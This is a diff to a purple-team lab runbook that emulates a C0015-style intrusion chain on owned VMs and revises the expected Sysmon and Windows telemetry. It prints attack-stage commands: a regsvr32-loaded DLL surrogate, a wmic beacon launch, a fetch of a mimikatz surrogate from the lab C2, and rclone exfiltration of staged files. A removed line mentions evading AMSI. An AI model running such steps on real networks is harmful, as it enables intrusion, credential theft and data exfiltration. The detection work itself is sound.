@@ -1,6 +1,6 @@
 # C0015 Attack Runbook — definitive step-by-step (Campaign S1–S14)
 
-Canonical, machine-by-machine runbook for reproducing the C0015-inspired chain on the lab.
+Machine-by-machine runbook for the C0015-inspired laboratory chain. Command blocks are retained templates: placeholders, ellipses and historical per-run filenames require runtime resolution. This document is not a fresh execution result.
 All steps are **benign surrogates on owned VMs**. Every stage lists: the **machine(s) and
 account**, the **files involved** (C2-host path and guest path), the **exact commands**
 (host invocation + guest/beacon command), the **expected telemetry** per channel, and the
@@ -18,8 +18,7 @@ account**, the **files involved** (C2-host path and guest path), the **exact com
 | Telemetry | Elastic 9.5.3 (ELASTIC01, Tailscale) | `elastic` (env-only creds) | aliases `logs-windows.sysmon_operational-c0015*`, `logs-system.security-c0015*` |
 
 Conventions: `RUN=<RUN-YYYYMMDD-NN>` for every command; artifacts land under
-`evidence/runs/<RUN>/`; each beacon command goes through the session token
-`TOKEN=<S1-…>` from `c2sim.log` (`POST :8080/cmd?session=$TOKEN -Body '<cmd>'`).
+`evidence/runs/<RUN>/`; beacon tasking uses the full session token. Log lines may abbreviate tokens; `/sessions` or the runtime token file supplies the full value. Match stage, host and run before selecting it. The existing token-selection snippet below is illustrative, not a complete parser.
 
 ---
 
@@ -35,8 +34,7 @@ pwsh payloads/packaging/run_campaign_orchestrator.ps1 -RunId $RUN -Action Pre
 Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
 # beacons + tools served by :8000 must be staged: 143.dll, beacon, conf, mimikatz, rclone, conf, AnyDesk, ProcessHacker
 ```
-(P0 hangs on the tooling **not** being pre-installed on victims — everything arrives over
-`:8000` during the run (T1105) or via the macro self-write.)
+(The macro writes its embedded entry artifacts. Compiled tools, harness preparation files and later stage configuration have separate delivery paths. A clean pre-run victim state requires inspection; macro self-write does not prove that no preparation files existed.)
 
 **WS01 (admin VM session; `C0015\it.admin`):**
 1. Clear Word state for **both** profiles (automation reliability):
@@ -81,8 +79,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
   downloads `c0015-comparefor.jpg` (the DLL surrogate) from `:8000` and runs
   `regsvr32 /s c0015-comparefor.jpg`; the DLL registers and spawns the phase3 beacon.
 - **Expected telemetry**:
-  - Sysmon E1: `WINWORD.EXE` (par=explorer) → `mshta.exe` (par=WINWORD, same entity) →
-    `regsvr32.exe` (par=mshta, same entity) → `powershell.exe` (par=regsvr32);
+  - Sysmon E1: `WINWORD.EXE` (par=explorer) → `mshta.exe` (par=WINWORD) → `regsvr32.exe` (par=mshta) → `powershell.exe` (par=regsvr32). Each process has its own entity; join child.parent.entity_id to parent.process.entity_id on WS01;
   - Sysmon E11: the three macro-written files (proc=WINWORD);
   - Sysmon E3: `:8000` (HTA download) then `:8080` (beacon poll);
   - `C:\Windows\Temp\c0015wf.log` step log; C2-SIM `register` line.
@@ -120,16 +117,18 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
 
 ---
 
-## S6 — Target manifest (orchestration) — **NOT RUN in the reference runs**
+## S6 — Fixed-target decision (orchestration)
 
-- Skipped by design; recorded as `NOT RUN` in the ledger with a reason. (Do not claim PASS.)
+- **RUN-05 through -08:** recorded as NOT RUN.
+- **RUN-09:** executed server-side decision for fixed scenario target FS01; `ART-06-02-RUN09.json` records the run and target. The code does not establish a discovery-listing-derived selection algorithm.
+- This is orchestration evidence, not a dedicated endpoint rule. No historical credential acquisition or target-selection logic should be inferred from it.
 
 ---
 
 ## S7 — Privilege elevation (local; operator remote)
 
 - **Machine**: WS01; **file**: `C:\Windows\Temp\elevate.cmd` (wmic local create as it.admin).
-- **Command** (guest, via vmrun as it.admin — the **only** non-beacon intrusion step):
+- **Command** (guest, via vmrun as it.admin — an out-of-band lab identity handoff; RDP and impact also have separate harness/client origins):
   ```cmd
   wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\C0015\c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini"
   ```
@@ -143,8 +142,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
 ## S7b — LSASS-access surrogate (credential-access **surface**, no extraction)
 
 - **Machine**: WS01; **file**: `C:\Tools\mimikatz.exe` (fetched from `:8000/tools`).
-- **Commands** (beacon, elevated token — split strings on the C2 host to avoid host-AMSI
-  signatures; the guest command is the plain form):
+- **Existing command templates** (beacon, elevated token; executable is the compiled lab surrogate, not real Mimikatz):
   ```powershell
   # fetch
   Invoke-WebRequest http://192.168.50.1:8000/tools/mimikatz.exe -OutFile C:\Tools\mimikatz.exe -UseBasicParsing
@@ -188,8 +186,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
   `LabEntry` argument; **E7** ImageLoad of `c0015_143_surrogate.dll` (Signed=false) within
   seconds; E11 marker; the DLL spawns the phase7-session2 beacon (E1 powershell
   parent=rundll32).
-- **Evidence**: E1+E7 es_ids (E7 hash field is often unpopulated — record path+signed,
-  note the limitation).
+- **Evidence**: E1/E7 Elasticsearch IDs, UTC times, same-host loader entity, path/signature and **file.hash.sha256**. Compare the ECS hash with the expected artifact. The prior “unpopulated” interpretation checked the wrong field.
 
 ---
 
@@ -221,7 +218,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
   Expand-Archive stage\p3\collect6.zip stage\p3\collect6 -Force
   python scripts/lab_tools.py manifest-new stage\p3\collect6 $RUN -o evidence/runs/$RUN/ART-08-01-RUN06.json   (rename as needed)
   ```
-- **Expected telemetry**: FS01 E11 (`*collect*`), S5145 (C$/Finance reads).
+- **Expected telemetry**: FS01 E11 staging and S5145 on C$ for the implemented UNC path. E11 is not ordinary-read telemetry and 5145 is an access check. The WS01 process performs collection; FS01 stores the staged files.
 - **Evidence**: manifest (11 files, per-file sha256) — the anchor for the transfer receipts.
 
 ---
@@ -237,14 +234,13 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
     sink:round1/DATA --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 `
     --bwlimit 10M --config C:\ProgramData\C0015\rclone.conf
   ```
-  Round 2 = `sink:round2/DATA` after the RDP step (day1/day4 mirror).
+  The two sink rounds are distinct receipt sets. Historical between-round RDP ordering is an intended mirror, not a universal replay property: RUN-06 has its RDP logon before both transfer rounds. Use each ledger timeline.
 - **Receipts (C2 host)** — observed per-file data, canonical manifest hash:
   `python stage/analysis/gen_receipts06.py`-style generator writes
   `evidence/runs/$RUN/ART-09-01-round{1,2}-RUN<NN>.json` with `sink_files`
   (name/size/sha256 from `stage/sink/$RUN/round{N}/DATA`) and
   `manifest_sha256` = canonical (LF-normalized) hash of the manifest.
-- **Expected telemetry**: E1 `rclone.exe` (parent=cmd), E3 `:9001`; **no rclone-specific
-  rule** — evidence = events + receipts.
+- **Expected telemetry**: E1 `rclone.exe` and entity-owned E3 to :9001. **R24** covers transfer-tool egress; completed transfer evidence remains events plus full-set sink receipts.
 - **Evidence**: both rclone E1 es_ids, both receipts (11/11 per-file equality accepted by
   the verifier).
 
@@ -262,8 +258,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
   ```
 - **Interpretation**: 4624 T3 = network; **T10 = RemoteInteractive** (the only proof of a
   completed interactive logon); T4 = batch (not RDP-specific). Record the event (account,
-  TargetLogonId) and the R19 alert ids; session lifetime is usually not captured (keep
-  the stage PARTIAL unless fully characterized).
+  TargetLogonId) and the R19 alert IDs separately. All five retained runs have a 4634 Type-10 logoff joined by the same FS01 TargetLogonId, after the logon. Verify host, account/type and boot context. S12 remains PARTIAL only for separately unverified 4778 reconnect/4779 disconnect behavior; no additional replay is required for the recorded logon-to-logoff conclusion.
 - **Files**: none beyond the standard Security log.
 
 ---
@@ -282,8 +277,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
   ```
 - **Expected telemetry**: E11 (Videos\ and C:\ root), E1 runs (AnyDesk after its drop —
   the verifier checks drop→run ordering), R20.
-- **Evidence**: E11/E1 es_ids; note this is **host-level correlation** (R20 does not prove
-  the executed binary is the dropped file).
+- **Evidence**: E11/E1 es_ids; note this is **host-level correlation** (R20 does not prove the executed binary is the dropped file). Cross-check path/hash when present. Its executable predicate covers remote-access software, not ProcessHacker; the latter has separate deployment evidence.
 
 ---
 
@@ -302,8 +296,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
   powershell ... -Action Rollback
   powershell ... -Action Verify     # expect hash-equal
   ```
-- **Expected telemetry**: FS01 E11 corpus/renames/note (drives the E11 sweep); no
-  dedicated detection rule (R21 retired).
+- **Expected telemetry**: FS01 E11 observed creates/notes; not guaranteed rename records. **R22/R23** cover note creation and same-process fan-out. R21 is retired. Notes/fan-out do not prove encryption; impact output and rollback provide separate content-state evidence.
 - **Evidence**: console output → `evidence/runs/$RUN/ART-14-01-RUN<NN>.txt` + JSON summary
   (actions + the harness "file in use" note explanation).
 
@@ -319,7 +312,7 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
   python -m unittest discover -s scripts/tests           # 20 offline component tests
   ```
 - Then: write the ledger `evidence/runs/$RUN/RUN-<id>.json` (schema-conform: per-stage
-  rows incl. S6 NOT RUN, input/output artifacts, canonical artifact_index hashes), the
+  rows including the run-specific S6 status, input/output artifacts, and canonical artifact_index hashes), the
   scorecard `ART-15-01-…`, and `reports/reference-run-<id>.md` (timeline with real UTC
   event/alerts, alert volume split, limitations). No estimated timestamps in ledger
   `ts` fields — put approximations in the detail text.
@@ -330,7 +323,5 @@ Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
 
 - Cleanup (beacons, Word, mshta, AnyDesk/ProcessHacker, rclone, servers):
   `pwsh payloads/packaging/launch_servers.ps1 -Stop` + taskkills per VM.
-- Alert hygiene: close stale alerts before any re-run
-  (`_update_by_query` on `.internal.alerts-security.alerts-default-*`, `workflow_status=closed`).
+- Alert hygiene is separate from evidence collection. The historical `_update_by_query` attempt did not persist the intended status update; the lab later cleared alert documents before RUN-07. Preserve archived alert references and document cleanup when interpreting later live queries. Do not treat the failed attempt as a verified procedure.
 - Commit with a short message; keep the tree green (tests OK).
-
